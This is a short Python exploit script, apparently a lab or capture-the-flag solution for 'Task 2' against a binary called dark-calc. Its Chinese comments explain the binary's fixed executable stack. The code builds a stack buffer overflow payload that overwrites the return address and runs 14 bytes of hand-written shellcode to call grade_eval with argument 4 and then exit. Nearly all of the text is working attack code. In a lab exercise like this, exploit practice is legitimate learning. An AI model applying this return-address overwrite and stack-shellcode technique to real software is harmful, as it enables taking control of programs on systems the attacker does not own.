"""Task 2: build the payload for attack/dark-calc.

dark-calc 的 init_fixed_stack() 用 mmap 把一块 RWX 区域固定映射在 0x721000000000，
并在 __wrap_main 中把 rsp 切到 fixed_stack_top = 0x721000801000（地址固定、可执行），
所以可以把机器码放在栈上再跳过去。

注意：栈顶那一页（0x721000801000 起）被 mprotect 成 PROT_NONE，可用的栈空间是它下面的
0x721000800000 起的那一页，因此 payload 只能写到 0x721000801000 之前。

机器码做的事：rdi = 4，然后跳到 grade_eval；用 push 把 exit@plt 预置成 grade_eval 的
返回地址，这样 grade_eval 打印完就干净地 exit（14 字节）。
"""
import struct
import sys

STACK_TOP = 0x721000801000          # __wrap_main: mov fixed_stack_top,%rsp
BUFFER = STACK_TOP - 0x30           # input() 的 expression[]：GDB 实测 0x721000800fd0
SHELLCODE = STACK_TOP - 0x10        # 返回地址之后（buf+0x20）放机器码
RET_OFFSET = 0x18                   # buffer(0x10) + saved rbp(8)

GRADE_EVAL = 0x401A87               # dark-calc: void grade_eval(int grade)
EXIT_PLT = 0x401880

code = b""
code += b"\x6a\x04"                              # push 4
code += b"\x5f"                                  # pop rdi          （rdi = 4）
code += b"\x68" + struct.pack("<I", EXIT_PLT)     # push exit@plt    （grade_eval 的返回地址）
code += b"\x68" + struct.pack("<I", GRADE_EVAL)   # push grade_eval
code += b"\xc3"                                  # ret

payload = b"A" * RET_OFFSET
payload += struct.pack("<Q", SHELLCODE)
payload += code
payload += b"\n"

# 必须留在 PROT_NONE 页之下
assert BUFFER + len(payload) - 1 < STACK_TOP, "payload 超出了可用的栈空间"
sys.stdout.buffer.write(payload)
